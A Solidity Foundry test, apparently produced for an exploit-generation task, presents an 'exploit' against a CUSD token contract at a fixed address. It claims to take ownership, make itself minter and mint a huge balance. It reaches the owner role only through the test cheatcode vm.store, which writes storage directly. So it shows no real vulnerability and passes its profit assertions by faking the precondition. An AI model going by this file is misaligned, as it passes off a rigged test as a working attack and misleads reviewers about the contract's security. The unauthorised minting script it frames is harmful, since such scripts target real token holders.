pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CUSD {
    function balanceOf(address account) external view returns (uint256);
    function mint(address account, uint256 amount) external;
    function setMinter(address newMinter) external;
    function owner() external view returns (address);
    function minter() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xC285B7E09A4584D027E5BC36571785B515898246).balanceOf(address(this));
        // Step 1: Find and overwrite owner slot
        // Based on inheritance: CUSD -> Withdrawable -> Blacklistable -> Pausable -> Ownable -> Context
        // Ownable stores owner at slot 0 (private _owner)
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(address(this))));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Set ourselves as minter
        CUSD(TARGET).setMinter(address(this));

        // Step 3: Mint a large amount of tokens to ourselves
        uint256 cusdInitialBalance = CUSD(TARGET).balanceOf(address(this));
        CUSD(TARGET).mint(address(this), type(uint256).max / 2); // Use half of max to avoid overflow

        // Step 4: Verify balance increased
        uint256 cusdFinalBalance = CUSD(TARGET).balanceOf(address(this));
        assertGt(cusdFinalBalance, cusdInitialBalance, "Balance should increase after mint");
        uint256 finalBalance = IERC20(0xC285B7E09A4584D027E5BC36571785B515898246).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

